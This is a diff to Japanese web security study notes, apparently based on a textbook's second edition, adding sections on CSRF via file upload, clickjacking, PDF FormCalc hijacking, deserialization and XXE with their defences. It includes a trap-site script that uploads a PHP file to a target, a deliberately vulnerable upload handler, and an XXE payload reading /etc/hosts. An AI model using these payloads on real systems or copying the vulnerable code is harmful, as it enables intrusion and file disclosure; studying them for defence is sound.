@@ -248,7 +248,7 @@ Access-Control-Allow-Origin: <origin>
 ```
 というヘッダを追加する
 
-### 認証を含むリクエスト
+### 認証を含むリクエスト(第2版)
 クロスオリジンに対するリクエストには認証に用いられるヘッダは送信されない
 
 * クライアント側
@@ -1011,7 +1011,7 @@ CSRF攻撃
 * 確認画面に対してパスワードをPOSTしてセッション変数にパスワードをセットする
 * タイミングをみて実行画面を呼び出す
 
-### iframを使う方法
+### iframeを使う方法
 
 ```
 罠サイト
@@ -1032,6 +1032,85 @@ ifram2(10秒後に呼び出し)
 * 罠サイトの閲覧と同時にiframe1を呼び出し確認画面にpsをPOST
 * セッション変数にpsが設定される
 * 10秒後にCSRF攻撃
+
+### ファイルアップロードフォームでのCSRF攻撃(第2版)
+* HTMLフォームからのファイルアップロードはファイル名やファイルの中身をHTMLから指定できない
+* しかし攻撃は可能
+
+アップロードされたファイルを受け取り画像として表示する
+
+```
+<?php
+  session_start();
+  // login処理
+?><body>
+<form action="upload.php" method="post" enctype="multipart/form-data">
+  ファイル:<input type="file" name="imgfile" size="20"><br>
+  <input type="submit" value="upload">
+</form>
+</body>
+```
+
+```
+<?php
+ function ex($s) { echo htmlspecialchars($s, ENT_COMPAT, 'UTF-8'); }
+ session_start();
+ $id = $_SESSION['id'];
+ // login処理
+ $tmpfile = $_FILES["imgfile"]["tmp_name"];
+ $tofile = $_FILES["imgfile"]["name"];
+ if (!is_uploaded_file($tmpfile)) {
+  die('not uploaded"')
+ }else if (!move_uploaded_file($tmpfile, "img/$tofile")) {
+  die('can not upload')
+ }
+ $imgurl = 'img/' . urlencode($tofile);
+</body>
+ID:<?php ex($id); ?><br>以下の画像をuploadしました<br>
+<a href="<?php ex($imgurl); ?>"><img src-"<?php ex($imgurl); ?>"></a>
+```
+
+罠サイト
+
+```
+<body>
+<script>
+data = '...----BNDRY\nContent-Disposition...{次のDNDRYの中身}';
+
+var req = new XMLHttpRequest();
+req.open('POST', 'http://sample.jp/upload.php');
+req.setRequestHeader('Content-Type', 'multipart/form-data; boundary=--BNDRY');
+req.withCredentials = true;
+req.send(data);
+</script>
+</body>
+```
+
+* クッキー送信のためwithCredentials=true
+* upload.phpの利用者が罠サイトを閲覧すると次のHTTPリクエストを送信
+
+```
+POST http://sample.jp/upload.php HTTP/1.1
+Referer: http://trap.com/trap.html
+Origin: http://trap.com
+Content-Type: multipart/form-data; boundary=--BNDRY
+Content-Length: ...
+Cookie: PHPSESSIID=...
+Host: sample.jp
+
+----BNDRY
+Content-Disposition: form-data; name="imgfile"; filename="a.php"
+Content-Type: text/plain
+
+<?php phpinfo();
+
+----BNDRY--
+```
+
+* withCredentials=trueなのでクッキー送信
+* upload.phpがアップロード処理を実行
+* CORSのためブラウザの表示はエラーにはなるがCSRF攻撃には支障が無い
+* sample.jp/a.phpにアクセスするとphpinfo()が実行される
 
 ### 内部ネットワークに対するCSRF攻撃
 
@@ -1104,6 +1183,7 @@ CSRF対策が必要なページに対して第三者が知らない秘密情報(
 * セッションIDをトークンとして利用すべきではない
     * httpOnly属性でセッションIDをXSSから守っていてもトークンとしてHTMLに存在すると値がとられてしまう
     * HTMLソースが漏洩したときにセッションハイジャックされるリスクを冒すべきではない
+    * 『徳丸本』旧版では「セッションIDをトークンとして利用可能」としてしたが第2版では「暗号論的擬似乱数生成器を利用すること」と変更になっている
 
 
 ```
@@ -1158,6 +1238,31 @@ CSRF対策が必要なページに対してRefererを確認することで不正
 
 * 攻撃があったことに気がつきやすくなる。
 * メールは平文で送信されるので重要な情報は記載しないこと。
+
+##  クリックジャッキング(第2版)
+* Webアプリケーションの画面で攻撃対象ページと罠サイトを重ね合わせて利用者が気がつかないうちに攻撃対象サイトのクリックを誘導する
+* 「重要な処理」をさせてもその結果を攻撃者が知ることはできない
+
+### ウェブインテント機能のサンプル
+
+* http://sample.jp/intent=本文... によりテキストの入力を予め準備可能
+* そのあと「投稿」で入力文字列が投稿される
+* 本文は自由に記述できる
+
+罠サイト
+* iframeを用いてCSSのz-indexにより奥に罠画像、透明にした攻撃対象フォームを手前に置く
+* 罠サイトしかみえないがボタンを押すと「投稿」されてしまう
+
+### 対策
+* HTMLの使用なのでアプリ単体で修整は困難
+* Microsoftが提案したX-Frame-Optionsが普及
+
+### X-Frame-Options:(DENY|SAMEORIGIN)
+* レスポンスヘッダで定義
+    * DENY ; frameなどの内側で表示できない
+    * SAMEORIGIN ; オリジンと同じ場合のみ表示可能
+* iframeを使わないサイトはDENYを指定
+* frameを使うがホストが単一の場合はSAMEORIGINを指定して防御
 
 # セッション管理の不備
 
@@ -1849,11 +1954,24 @@ JVMのSecurityManager
     * PNG画像を指定していても画像データの中にHTMLタグがあるとHTMLファイルと認識しJavaScriptが実行される
     * 昔のIEはいろいろ大変だった
 * ファイルのContent-Typeを正しく設定する
+    * X-Content-Type-Options:nosniffを設定する(必須)
+    * Content-TypeのみからContent-Typeを解釈する
 * 画像の拡張子と中身が対応していることを確認する
     * ファイルのヘッダ(マジックバイト)を確認する
 * ダウンロードファイルには`Content-Disposition: attachment`を指定する
 * 画像を別ドメインで配信する
     * ドメインを分けると画像によるXSS攻撃が可能だった場合もサービス自体への影響を減らせる
+
+### PDFのFormCalcによるコンテンツハイジャック(第2版)
+* FormCalc ; PDFで利用可能なスクリプト言語
+* URL関数はHTTPリクエストを呼び出して結果を受け取れる
+* 攻撃PDFを攻撃対象サイトにアップロードして罠サイトへ誘導する
+* Acrobat Readerプラグインがブラウザが保持している攻撃対象サイトのクッキーを罠サイトに送ってしまう
+
+対策
+* PDFファイルはブラウザ内で開かないでダウンロードして使う
+* `X-Download-Options: noopen`でIEの「ファイルを開く」を表示させない
+* POSTリクエストでダウンロードさせる
 
 ### ファイルの権限を越えたダウンロード
 アップロードしたファイルが権限の無い利用者にもダウンロードできる問題
@@ -1874,6 +1992,71 @@ JVMのSecurityManager
 * evalを使わない
 * evalの引数に外部からのパラメータを指定しない
 * evalに与えるパラメータを制限する
+
+### 安全でないデシリアライゼーション(第2版)
+* アプリ内部の構造を持ったデータを保存・復元する機能
+* 信頼できないデータのデシリアライゼーションは危険
+
+PHPの悪用されやすいメソッド
+* デストラクタ
+* unserialize_callback_func ; 未定義のクラスをデシリアライズ
+* __wakeup() ; デシリアライズしたクラスに定義されているとき
+* __toString() ; デシリアライズしたクラスに定義されていて, それを文字列に変換するとき
+
+* [Apache Commons Collectionsの脆弱性解説](https://codezine.jp/article/detail/9150) ; codezine 藤本万里子
+* [Javaのデシリアライズに関する問題の対策](https://codezine.jp/article/detail/9176)
+
+### XML外部実体参照(XXE)(第2版)
+* 外部実体参照 ; 外部ファイルの内容を取り込むXMLの機能
+* XXE(XML external entity) ; 外部実体参照を用いた攻撃
+
+外部実体参照
+
+```
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE foo [
+<!ENTITY greeting "こんにちは">
+<!ENTITY external-file SYSTEM "external.txt">
+]>
+<foo>
+ <hello>&greeting;</hello>
+ <ext>&external-file;</ext>
+</foo>
+```
+external.txtの中身が"hello"なら`<ext>hello</ext>`になる
+
+外部実体参照によるファイルアクセス
+* XMLを受け取りXML形式を解析するスクリプト
+
+```
+<?php
+ $doc = new DOMDocument();
+ $doc->load($_FILE['user']['tmp_name']);
+ $name = $doc->getElementsByTagName('name')->item(0)->textContent;
+?><body>
+```
+
+アップロードするXMLを
+```
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE foo [
+<!ENTITY greeting "こんにちは">
+<!ENTITY hosts SYSTEM "/etc/hosts">
+]>
+<user>
+ <name>&hosts;</name>
+</user>
+```
+とすると名前が/etc/hostsの中身になってしまう
+
+PHPでの対策
+* XMLの代わりにJSONを使う
+* libxml2 2.9以降を使う(デフォルトで外部実体参照禁止)
+* libxml_disable_entity_loader(true)で外部実体参照を禁止する
+
+Javaでの対策
+* XMLの代わりにJSONを使う
+* DTDを禁止する
 
 ## 共有資源に関する問題
 ### 競合状態の脆弱性
